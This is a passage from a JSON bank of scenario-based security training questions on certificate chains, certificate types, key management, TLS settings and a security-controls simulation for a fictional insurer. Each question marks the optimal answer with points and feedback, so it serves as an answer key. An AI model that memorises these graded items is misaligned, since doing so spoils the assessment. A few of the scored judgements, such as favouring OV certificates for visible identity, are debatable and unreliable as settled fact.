            "feedback": "Correct diagnosis and fix. Browsers have root CA certificates in their trust stores, but intermediate CAs must be provided by the server. Without the intermediate, browsers can't build the chain from your certificate to a trusted root. Always deploy the full chain.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Add the root CA certificate to the server configuration since browsers need to see it.",
            "feedback": "You're close, but browsers already have root CA certificates in their trust stores. Sending the root is unnecessary (and slightly wasteful). What browsers need is the INTERMEDIATE certificate that connects your certificate to the root they already have.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "The certificate must be corrupt. Request a new certificate from the CA.",
            "feedback": "The certificate itself is probably fine - the issue is missing chain certificates in the server configuration. Before requesting new certificates, always check the chain configuration. Most 'untrusted certificate' errors are configuration issues, not certificate problems.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Tell users to click through the warning since the certificate is valid.",
            "feedback": "Never train users to ignore security warnings! This creates terrible security habits and may indicate a real issue. Additionally, browsers are increasingly preventing click-through for certificate errors. Fix the configuration properly.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "What connects your end-entity certificate to the root CA that browsers trust?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "Intermediate CA certificates must be provided by the server - browsers don't have them pre-installed.",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP06",
        "sequence": 6,
        "title": "Module 4B: Certificate Types",
        "situation": "Continuing with certificates, the marketing team has a question.\n\n**Ticket #4745:** 'We're launching a new e-commerce store for TechStart merchandise. Should we get a DV, OV, or EV certificate? What's the difference and which is best for our store?'\n\nSarah notes: 'This is about certificate validation levels. Each type provides different assurance about who owns the certificate.'\n\n**Question:** What certificate type do you recommend for the merchandise store?",
        "options": [
          {
            "id": "A",
            "text": "OV (Organization Validated) - it confirms TechStart is a real organization while being practical for e-commerce. Customers can verify they're buying from the actual company.",
            "feedback": "Great recommendation. OV provides organizational identity verification at a reasonable cost and timeline. For an e-commerce store, customers benefit from seeing the verified organization name. EV would be overkill for merchandise, and DV doesn't provide enough identity assurance for payment processing.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "DV (Domain Validated) - it's cheapest and provides the same encryption as other types.",
            "feedback": "While DV provides the same encryption strength, it only proves domain control - not organization identity. For e-commerce where customers are entering payment information, OV or EV provides assurance they're on the real company's site. DV is fine for informational sites but less appropriate for transactions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "EV (Extended Validation) - e-commerce should have the highest level of trust.",
            "feedback": "EV provides maximum identity assurance, but for a merchandise store, it may be overkill. EV is expensive and time-consuming (1-2 weeks). It's typically reserved for financial institutions and high-value transaction sites. OV provides appropriate assurance for general e-commerce.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Self-signed certificate - we can generate it ourselves for free and it provides the same encryption.",
            "feedback": "Self-signed certificates aren't trusted by browsers - customers would see scary security warnings. While technically providing encryption, without CA validation, users can't verify they're on your real site. Never use self-signed certificates for public-facing services.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "Consider what customers need to trust when making purchases. Domain control alone, or organizational identity?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "OV verifies the organization exists - important for e-commerce where customers enter payment info.",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP07",
        "sequence": 7,
        "title": "Module 5: Key Management",
        "situation": "Module 5 addresses key management with a concerning discovery.\n\n**Ticket #4750:** 'During a security review, we found that the encryption key for the student database is stored in a config file on the application server. The file has restricted permissions, but is this acceptable?'\n\nSarah looks concerned: 'Key management is where many encryption implementations fail. Let's talk about where keys should and shouldn't be stored.'\n\n**Question:** What do you recommend for securing the database encryption key?",
        "options": [
          {
            "id": "A",
            "text": "Move the key to a dedicated key management system (KMS) or HSM. Application servers should retrieve keys at runtime, never store them persistently.",
            "feedback": "Excellent recommendation. A KMS or HSM provides: secure key storage, access control, audit logging, and key lifecycle management. Keys should never be stored in files on application servers - if the server is compromised, so are all keys. KMS retrieval at runtime limits exposure.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Encrypt the config file that contains the key. Problem solved.",
            "feedback": "This creates a 'key for the key' problem - where do you store THAT key? You haven't eliminated the problem, just moved it. Eventually you need secure hardware storage. Config file encryption can add a layer but isn't a complete solution.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "The restricted file permissions are sufficient. Only root can read the file.",
            "feedback": "File permissions are better than nothing, but insufficient for sensitive keys. Server compromise, backup exposure, and privileged user abuse can all expose the key. Compliance frameworks typically require dedicated key management for encryption keys.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Store the key in the database alongside the encrypted data for convenience.",
            "feedback": "This defeats the purpose of encryption entirely! If an attacker gets the database, they get both the encrypted data AND the key. The encryption provides zero protection. Keys must be stored separately from the data they protect.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "What happens to the key if the application server is compromised? Where would it be safer?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "KMS and HSM solutions provide hardware-protected key storage with access controls and auditing.",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP08",
        "sequence": 8,
        "title": "Module 5B: Key Rotation",
        "situation": "Continuing with key management, another issue surfaces.\n\n**Ticket #4755:** 'The same AES key has been used for database encryption since the system was built 5 years ago. Should we change it? How do we rotate encryption keys without losing access to old data?'\n\nSarah explains: 'Key rotation is essential but tricky. You need to decrypt old data with the old key while encrypting new data with the new key. Let's work through this.'\n\n**Question:** How do you recommend implementing key rotation for the database encryption?",
        "options": [
          {
            "id": "A",
            "text": "Implement envelope encryption: use key-versioning in KMS where new data uses the current key and old data can still be decrypted with previous key versions until re-encrypted.",
            "feedback": "This is the proper approach. Envelope encryption and key versioning allow: new data encrypted with current key, old data accessible via previous key versions, gradual re-encryption without downtime, and clean audit trail of which key version encrypted which data.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Generate a new key, decrypt all data with the old key, re-encrypt with the new key, then delete the old key.",
            "feedback": "This works but has problems: massive operation (millions of records), requires downtime, all-or-nothing risk. If the process fails midway, you could have data encrypted with both keys, creating complexity. Key versioning is more practical.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "5 years without rotation is fine. The key hasn't been compromised, so why change it?",
            "feedback": "How do you know it hasn't been compromised? One reason for key rotation is that compromise may be undetected. Additionally, compliance frameworks typically require annual rotation. Cryptographic best practices recommend regular rotation regardless of known compromise.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Create the new key and immediately delete the old key. The old encrypted data isn't important.",
            "feedback": "Never delete a key while data encrypted with it still exists! You would permanently lose access to all data encrypted with that key. Key retirement must wait until all data has been re-encrypted with the new key.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "How can you encrypt new data with a new key while still decrypting old data with the old key?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "Key versioning lets you maintain multiple key versions - current for new data, previous for old data.",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP09",
        "sequence": 9,
        "title": "Module 6: Transport Security",
        "situation": "The final module focuses on selecting the right cryptographic solutions.\n\n**Ticket #4760:** 'The network team asks about TLS configuration for our web servers. We currently support TLS 1.0 through 1.3. What versions should we allow, and what cipher suites are acceptable?'\n\nSarah notes: 'TLS configuration is about balancing security with compatibility. Let's work through the decisions.'\n\n**Question:** What TLS configuration do you recommend?",
        "options": [
          {
            "id": "A",
            "text": "TLS 1.2 minimum, TLS 1.3 preferred. Require forward secrecy (ECDHE), use AEAD ciphers (AES-GCM), disable all weak algorithms including RC4, 3DES, and SHA-1 for MAC.",
            "feedback": "Excellent configuration. TLS 1.2 minimum disables known-vulnerable protocols. TLS 1.3 preferred gets the best security where supported. Forward secrecy ensures session keys can't be recovered even if private keys are compromised later. AEAD ciphers provide authenticated encryption.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Keep TLS 1.0 enabled for compatibility with older systems. Security can't break functionality.",
            "feedback": "TLS 1.0 has known vulnerabilities (BEAST, POODLE variants). PCI DSS prohibited TLS 1.0 since 2018. While compatibility matters, keeping vulnerable protocols enabled creates real risk. Modern browsers have disabled TLS 1.0/1.1 anyway.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "TLS 1.3 only - it's the most secure, so we should use only that.",
            "feedback": "TLS 1.3 only may break compatibility with older but still legitimate systems (some enterprise proxies, older mobile devices). TLS 1.2 is still secure and widely needed. Unless you know all clients support 1.3, allow 1.2 as well.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Disable TLS entirely and use SSH tunnels for all web traffic.",
            "feedback": "SSH tunnels aren't appropriate for general web traffic. Browsers expect HTTPS (TLS). SSH is for terminal access and file transfers. Using the wrong protocol for the use case creates usability and security problems.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "What's the minimum TLS version that's considered secure? What versions are deprecated?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "TLS 1.2 minimum is current best practice. TLS 1.0/1.1 are deprecated and prohibited by PCI DSS.",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP10",
        "sequence": 10,
        "title": "Module 6B: Algorithm Selection Framework",
        "situation": "Final challenge - Sarah presents a summary scenario.\n\n**Scenario:** 'A new application is being built with these requirements:\n- Store user passwords securely\n- Encrypt database containing PII\n- Digitally sign software releases\n- Secure API communications\n- Verify integrity of downloaded content\n\nFor each requirement, which cryptographic solution applies?'\n\nSarah adds: 'This ties together everything from the clinic. Walk me through your algorithm selections.'\n\n**Question:** Which set of cryptographic solutions correctly addresses all five requirements?",
        "options": [
          {
            "id": "A",
            "text": "Passwords: Argon2 | Database: AES-256 | Signatures: ECDSA + SHA-256 | API: TLS 1.2+ | Downloads: SHA-256 hashes",
            "feedback": "Perfect selections across the board! You've correctly matched each use case to the appropriate cryptographic solution. Password hashing with Argon2, symmetric encryption for data at rest, asymmetric signatures for software, TLS for transport, and SHA-256 for integrity. This demonstrates comprehensive understanding.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Passwords: SHA-256 | Database: AES-256 | Signatures: RSA | API: TLS 1.2+ | Downloads: MD5 hashes",
            "feedback": "Two issues: SHA-256 is too fast for passwords (use Argon2/bcrypt), and MD5 is insecure for integrity verification (use SHA-256). The other selections are acceptable, but these mismatches show gaps in understanding algorithm selection.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Passwords: AES-256 | Database: RSA-4096 | Signatures: SHA-256 | API: TLS 1.0 | Downloads: CRC32",
            "feedback": "Multiple fundamental errors: passwords should be hashed not encrypted, RSA is wrong for bulk database encryption, SHA-256 alone isn't a signature algorithm, TLS 1.0 is deprecated, and CRC32 isn't cryptographic. This shows confusion about basic cryptographic concepts.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Passwords: bcrypt | Database: 3DES | Signatures: MD5 + RSA | API: SSL 3.0 | Downloads: SHA-1",
            "feedback": "bcrypt is correct for passwords, but everything else is deprecated or broken: 3DES is deprecated, MD5 is broken, SSL 3.0 is insecure, and SHA-1 is deprecated. You understand password hashing but need work on other algorithm selection.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "Work through each use case: What's special about passwords? What's good for bulk data? What makes a signature?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "Passwords=Argon2/bcrypt, Database=AES, Signatures=asymmetric+hash, Transport=TLS, Integrity=SHA-256",
            "penalty": 3
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D1-SIM-001",
    "title": "Security Controls Implementation",
    "domain": 1,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": 45,
    "role": "Security Analyst",
    "organization": {
      "name": "Pinnacle Insurance Group",
      "industry": "Insurance / Financial Services",
      "size": "Mid-size insurance company with 1,200 employees across 5 regional offices",
      "environment": "Hybrid infrastructure with on-premises data center and cloud services. Processes sensitive customer PII, health information for life insurance, and financial data. Subject to state insurance regulations and NAIC cybersecurity requirements.",
      "current_state": "Recent audit identified gaps in security controls framework. New CISO hired to mature security program. You've been tasked with helping implement a comprehensive controls framework."
    },
    "introduction": "You're a security analyst at Pinnacle Insurance Group, reporting to the newly hired CISO. A regulatory audit revealed that while the company has various security measures in place, they lack a structured controls framework. Controls are inconsistent across departments, and there's no clear mapping between security measures and the risks they address. Your task is to help design and implement a comprehensive security controls program that addresses regulatory requirements and protects the business.",
    "learning_objectives": [
      "Understand the categories of security controls (technical, managerial, operational, physical)",
      "Differentiate between control types (preventive, detective, corrective, deterrent, compensating)",
      "Apply appropriate controls to address specific security risks",
      "Understand how controls work together in a defense-in-depth strategy",
      "Balance control effectiveness with operational impact"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "Control Categories Assessment",
        "situation": "The CISO asks you to assess the current state of security controls. You find:\n\n- **IT Department**: Firewalls, antivirus, encryption tools deployed\n- **HR Department**: Background checks performed, security mentioned in employee handbook\n- **Facilities**: Badge readers at main entrance, security cameras in lobby\n- **Security Team**: Incident response procedures documented but not tested\n\nThe CISO asks: 'How would you categorize what we have, and what's missing?'\n\nHow do you categorize these existing controls?",
        "options": [
          {
            "id": "a",
            "text": "All controls are technical because they protect against cyber threats",
            "feedback": "Incorrect. Background checks are managerial/administrative controls (HR policy). Badge readers and cameras are physical controls. Only firewalls, antivirus, and encryption are technical controls. Security controls span multiple categories beyond just technology.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security controls include technical, managerial/administrative, operational, and physical categories. A complete program needs all types.",
            "consequences": {
              "immediate": "Misunderstanding of control categories",
              "security_impact": "May over-invest in technical controls while ignoring other categories",
              "business_impact": "Incomplete security program"
            }
          },
          {
            "id": "b",
            "text": "Technical (firewalls, AV, encryption), Managerial (background checks, handbook), Physical (badges, cameras), Operational (IR procedures)",
            "feedback": "Excellent categorization! Technical controls are implemented through technology. Managerial/administrative controls are policies and procedures from management. Physical controls protect physical assets and premises. Operational controls are day-to-day security practices. You've correctly identified all four categories.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "The four control categories are: Technical (technology-based), Managerial/Administrative (policies, procedures, governance), Physical (tangible protections), and Operational (day-to-day practices).",
            "consequences": {
              "immediate": "Clear understanding of current control landscape",
              "security_impact": "Can identify gaps in each category",
              "business_impact": "Foundation for comprehensive controls program"
            }
          },
          {
            "id": "c",
            "text": "Preventive controls (firewalls, badges) and Detective controls (antivirus, cameras)",
            "feedback": "You're describing control types (preventive, detective), not categories. While this classification is also valid, the CISO asked about categories. Firewalls are technical controls that are preventive. Cameras are physical controls that are detective. Categories and types are different classification schemes.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Control categories (technical, managerial, physical, operational) and control types (preventive, detective, corrective) are different classification dimensions.",
            "consequences": {
              "immediate": "Confused classification schemes",
              "security_impact": "May not address gaps in specific categories",
              "business_impact": "Incomplete analysis"
            }
          },
          {
            "id": "d",
            "text": "Hardware controls and software controls",
            "feedback": "This is too narrow a classification. It only addresses technical controls and misses managerial, physical, and operational categories entirely. Background checks aren't hardware or software. Security cameras are hardware but they're physical controls, not IT hardware controls.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security controls extend far beyond IT hardware and software. A complete framework includes policies, physical security, and operational practices.",
            "consequences": {
              "immediate": "Incomplete understanding of control landscape",
              "security_impact": "Major control categories ignored",
              "business_impact": "Gaps in non-technical areas"
            }
          }
        ],
        "hints": [
          "Think about who implements each control - IT, HR, Facilities, or Security team",
          "Consider whether controls are technology, policy, physical barrier, or process"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Control Types Selection",
        "situation": "The CISO wants to address a specific risk: unauthorized access to customer health information used for life insurance underwriting. This data is stored in a database and accessed by underwriters.\n\nShe asks: 'What types of controls should we implement? I want to prevent breaches, detect if something goes wrong, and be able to respond.'\n\nWhat control types do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "Focus on preventive controls only - if we prevent all breaches, we don't need detection or response",
            "feedback": "Prevention alone is insufficient. No preventive control is 100% effective. Without detective controls, you won't know when prevention fails. Without corrective controls, you can't recover. Defense in depth requires multiple control types working together.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Prevention is important but will eventually fail. Detective and corrective controls are essential for identifying and recovering from incidents.",
            "consequences": {
              "immediate": "Preventive controls implemented",
              "security_impact": "Breaches may go undetected; no recovery capability",
              "business_impact": "Extended breach duration; greater damage when prevention fails"
            }
          },
          {
            "id": "b",
            "text": "Layered approach: Preventive (access controls, encryption), Detective (logging, monitoring, DLP alerts), Corrective (incident response, backup restoration)",
            "feedback": "Excellent approach! Preventive controls stop unauthorized access before it happens. Detective controls identify when prevention fails. Corrective controls enable recovery and remediation. This defense-in-depth approach ensures security even when individual controls fail.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Control types work together: Preventive stops threats, Detective identifies incidents, Corrective enables recovery. Add Deterrent to discourage and Compensating for gaps.",
            "consequences": {
              "immediate": "Comprehensive control strategy",
              "security_impact": "Multiple layers of protection; quick detection and recovery",
              "business_impact": "Reduced breach impact; regulatory compliance demonstrated"
            }
          },
          {
            "id": "c",
            "text": "Detective controls are most important - we need to catch bad actors in the act",
            "feedback": "Detective controls are important but catching breaches in progress still means damage occurs. Prevention reduces the number of incidents to detect. Correction enables recovery. Prioritizing detection alone means accepting preventable incidents.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Detection is essential but should complement prevention, not replace it. The goal is to prevent what you can and detect what you can't prevent.",
            "consequences": {
              "immediate": "Strong monitoring but weak prevention",
              "security_impact": "More incidents occur; detected but not prevented",
              "business_impact": "Higher incident volume; reactive security posture"
            }
          },
          {
            "id": "d",
            "text": "Implement compensating controls since our legacy database can't support modern security features",
            "feedback": "Compensating controls are valuable when primary controls can't be implemented, but you haven't established that limitation yet. Start with the standard control types. If technical constraints prevent primary controls, then design compensating controls to address the gap.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compensating controls substitute when primary controls can't be implemented. They should provide equivalent protection, not be the default choice.",
            "consequences": {
              "immediate": "May implement workarounds without trying primary controls",
              "security_impact": "Compensating controls may be less effective than primary",
              "business_impact": "May accept limitations that don't actually exist"
            }
          }
        ],
        "hints": [
          "Think about what happens at each stage: before, during, and after an incident",
          "Consider what the CISO asked for: prevent, detect, and respond"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Technical Controls Implementation",
        "situation": "You're implementing technical controls for the health information database. The database team presents options:\n\n**Option A**: Implement transparent database encryption (TDE) for data at rest\n**Option B**: Implement application-level encryption where the app encrypts before storing\n**Option C**: Implement network encryption only (TLS) since data is encrypted in transit\n**Option D**: Implement all three layers\n\nWhat technical control approach do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "Option C - Network encryption is sufficient since we control our internal network",
            "feedback": "Network encryption protects data in transit but not at rest. If someone accesses the database directly (DBA, attacker with DB access, stolen backup), data is exposed. Internal networks aren't inherently trusted - insider threats and lateral movement are real risks.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Data needs protection both in transit AND at rest. Internal network control doesn't eliminate the need for encryption at rest.",
            "consequences": {
              "immediate": "Data encrypted in transit only",
              "security_impact": "Data at rest unprotected; backup tapes vulnerable",
              "business_impact": "May not meet regulatory requirements for health data protection"
            }
          },
          {
            "id": "b",
            "text": "Option A - TDE is easiest to implement and protects data at rest without application changes",
            "feedback": "TDE provides good protection at rest with minimal application impact. However, it doesn't protect against privileged database users who can read decrypted data. For highly sensitive health information, consider whether TDE alone is sufficient or if application-level encryption adds value.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "TDE protects against physical theft and storage-level access but not against privileged database access.",
            "consequences": {
              "immediate": "Data at rest encrypted transparently",
              "security_impact": "Protected against storage theft; DBAs can still see data",
              "business_impact": "Good protection with low implementation effort"
            }
          },
          {
            "id": "c",
            "text": "Option D - Defense in depth with all three layers provides comprehensive protection",
            "feedback": "Excellent! Defense in depth applies multiple controls so that failure of one doesn't mean complete compromise. TDE protects against storage theft. Application encryption protects against privileged DB access. Network encryption protects against interception. Each layer addresses different threats.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Defense in depth means multiple layers of controls. Each layer protects against different threats. If one fails, others still provide protection.",
            "consequences": {
              "immediate": "Comprehensive encryption implementation",
              "security_impact": "Protected against multiple threat vectors",
              "business_impact": "Strong regulatory compliance posture; higher implementation effort justified by data sensitivity"
            }
          },
          {
            "id": "d",
            "text": "Option B - Application-level encryption is strongest since keys aren't accessible to DBAs",
            "feedback": "Application-level encryption provides strong protection but is complex to implement correctly. Key management becomes the application's responsibility. Without TDE, someone with storage access sees encrypted blobs but backup management is complicated. Without TLS, data could be intercepted in transit.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Application-level encryption is powerful but complex. It's most effective as part of a layered approach, not as the sole control.",
            "consequences": {
              "immediate": "Strong encryption but complex implementation",
              "security_impact": "Protected against DB access but other gaps remain",
              "business_impact": "High development effort; potential operational complexity"
            }
          }
        ],
        "hints": [
          "Consider what threats each encryption type addresses",
          "Think about what happens if one control fails"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "Physical Controls Gap",
        "situation": "During your assessment, you visit the regional offices. You find:\n\n- **Main office**: Badge readers, security guard, cameras, server room with biometric lock\n- **Regional office A**: Badge reader at front door only; server closet uses regular key lock\n- **Regional office B**: No badge reader; receptionist buzzes people in; network equipment in unlocked closet\n\nRegional offices process the same sensitive health data as headquarters.\n\nHow do you address this physical security gap?",
        "options": [
          {
            "id": "a",
            "text": "Regional offices are lower risk because they're smaller; current controls are adequate",
            "feedback": "Size doesn't determine risk - data sensitivity does. If regional offices process the same health data, they need equivalent protection. Attackers may specifically target regional offices knowing they have weaker security. This is a significant compliance gap.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Physical security requirements should be based on data sensitivity and risk, not location size. Branch offices often need equivalent controls to headquarters.",
            "consequences": {
              "immediate": "No changes to regional offices",
              "security_impact": "Weak links in physical security chain",
              "business_impact": "Regulatory findings likely; data at regional offices vulnerable"
            }
          },
          {
            "id": "b",
            "text": "Implement baseline physical controls at all locations: badge access, secured network equipment, and camera coverage",
            "feedback": "Correct approach! Establish baseline physical security standards that apply regardless of location size. Badge access provides access control and audit trail. Secured network equipment prevents unauthorized physical access to infrastructure. Cameras provide deterrent and detective capability.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Physical security standards should be based on data/asset sensitivity and applied consistently across all locations processing that data.",
            "consequences": {
              "immediate": "Physical security standardized across organization",
              "security_impact": "Consistent protection regardless of location",
              "business_impact": "Regulatory compliance; reduced risk from physical attacks"
            }
          },
          {
            "id": "c",
            "text": "Move all sensitive data processing to headquarters; regional offices become thin clients",
            "feedback": "Centralizing processing could work but is a major architectural change that may not be operationally feasible. It doesn't address the physical security gap for network equipment that still exists at regional offices. This is avoiding the problem rather than solving it.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Architectural changes can reduce risk but physical security is still needed wherever network equipment and access points exist.",
            "consequences": {
              "immediate": "Major project to centralize processing",
              "security_impact": "Physical security still needed at regional offices",
              "business_impact": "Operational disruption; may not be feasible"
            }
          },
          {
            "id": "d",
            "text": "Implement compensating controls: increase cyber monitoring for regional office networks",
            "feedback": "Technical monitoring doesn't compensate for physical security gaps. If someone can physically access network equipment, they can tap network cables, install rogue devices, or steal equipment. Compensating controls should address the same risk - here, that's physical access control.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compensating controls should address the same risk as the control they replace. Cyber monitoring doesn't replace physical access controls.",
            "consequences": {
              "immediate": "Better monitoring but physical gaps remain",
              "security_impact": "Physical attack vectors unchanged",
              "business_impact": "May detect attacks but can't prevent physical compromise"
            }
          }
        ],
        "hints": [
          "What data do regional offices handle compared to headquarters?",
          "Consider whether the risk level justifies different control levels"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Managerial Controls Development",
        "situation": "The CISO wants to strengthen managerial controls. Currently, the company has:\n\n- Basic security policy (last updated 3 years ago)\n- Employee handbook mentions security responsibilities\n- No formal security awareness program\n- Background checks only for IT staff\n\nWhat managerial controls should be prioritized?",
        "options": [
          {
            "id": "a",
            "text": "Focus on updating the security policy first; everything flows from policy",
            "feedback": "Policy is important but a policy alone doesn't create security. Without training, employees don't know the policy. Without background checks, you may hire risks. Policy should be part of a comprehensive managerial controls program, not the only focus.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policies are directive controls that establish expectations. They need supporting controls (training, enforcement) to be effective.",
            "consequences": {
              "immediate": "Updated policy document",
              "security_impact": "Policy exists but may not be implemented",
              "business_impact": "Documentation improved but behavior unchanged"
            }
          },
          {
            "id": "b",
            "text": "Comprehensive approach: Update policies, implement security awareness training, expand background checks to all roles handling sensitive data",
            "feedback": "Excellent! Managerial controls work together. Policies establish expectations. Training ensures employees understand and can follow policies. Background checks reduce insider threat risk. Together, they create a security-aware workforce with appropriate screening.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Managerial controls include policies (directive), training (preventive), and screening (preventive). They work together to address human factors in security.",
            "consequences": {
              "immediate": "Comprehensive managerial controls program",
              "security_impact": "Employees informed and vetted; expectations clear",
              "business_impact": "Reduced human-factor risk; regulatory compliance"
            }
          },
          {
            "id": "c",
            "text": "Security awareness training is most important since employees are the weakest link",
            "feedback": "Training is critical but needs policy foundation. What do you train on without documented policies? Background checks also matter - training doesn't address intentional insider threats. A comprehensive approach addresses multiple human-factor risks.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Training is essential but must be supported by clear policies and complemented by other controls like screening.",
            "consequences": {
              "immediate": "Training program implemented",
              "security_impact": "Awareness improved but policy gaps remain",
              "business_impact": "Some risk reduction but incomplete program"
            }
          },
          {
            "id": "d",
            "text": "Background checks for all employees should be the priority given the sensitive health data",
            "feedback": "Background checks are important for sensitive data roles but don't address ongoing behavior. Employees need training to handle data properly. Policies define what's expected. A one-time check without ongoing controls is insufficient.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Background checks address pre-employment risk. Ongoing controls (training, policy, monitoring) address behavior after hiring.",
            "consequences": {
              "immediate": "Expanded background check program",
              "security_impact": "Better hiring screening but ongoing risks remain",
              "business_impact": "Some risk reduction but gaps in awareness and policy"
            }
          }
        ],
        "hints": [
          "How do policies, training, and screening work together?",
          "Consider both prevention of hiring risks and ongoing behavior"
        ]
      },
      {
        "id": "dp6",
        "sequence": 6,
        "title": "Operational Controls Assessment",
        "situation": "You're assessing operational controls - the day-to-day security practices. You find:\n\n- Patches are applied 'when IT has time' with no formal schedule\n- Backups run nightly but haven't been tested for restoration\n- Vulnerability scans run quarterly by an external vendor\n- Security events are logged but no one reviews them regularly\n\nWhat operational control improvements are most critical?",
        "options": [
          {
            "id": "a",
            "text": "Log review is most critical - without it, we can't detect incidents",
            "feedback": "Log review is important for detection, but unpatched systems and untested backups are equally critical. Unpatched systems create vulnerabilities to exploit. Untested backups may fail when needed. Operational controls need comprehensive improvement, not single focus.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Operational controls are interconnected. Detection without prevention or recovery capability is incomplete.",
            "consequences": {
              "immediate": "Log review process implemented",
              "security_impact": "Better detection but vulnerabilities remain",
              "business_impact": "May detect breaches but can't prevent or recover effectively"
            }
          },
          {
            "id": "b",
            "text": "All four areas need improvement: formalize patching, test backup restoration, increase scan frequency, implement log monitoring",
            "feedback": "Correct! All four operational areas have significant gaps. Patching prevents exploitation of known vulnerabilities. Backup testing ensures recovery capability. Regular scanning identifies vulnerabilities. Log monitoring enables detection. Each addresses different operational risks.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Operational controls include preventive (patching), detective (scanning, monitoring), and recovery (backups) practices. All need attention.",
            "consequences": {
              "immediate": "Comprehensive operational controls improvement plan",
              "security_impact": "Gaps in prevention, detection, and recovery addressed",
              "business_impact": "Mature operational security posture"
            }
          },
          {
            "id": "c",
            "text": "Patching is most critical since unpatched systems are how most breaches occur",
            "feedback": "Patching is critical but doesn't help with zero-days, misconfigurations, or other attack vectors. Without log review, breaches go undetected. Without tested backups, recovery from ransomware fails. Patching alone leaves significant gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Patch management is essential but doesn't address all vulnerabilities or provide detection and recovery capabilities.",
            "consequences": {
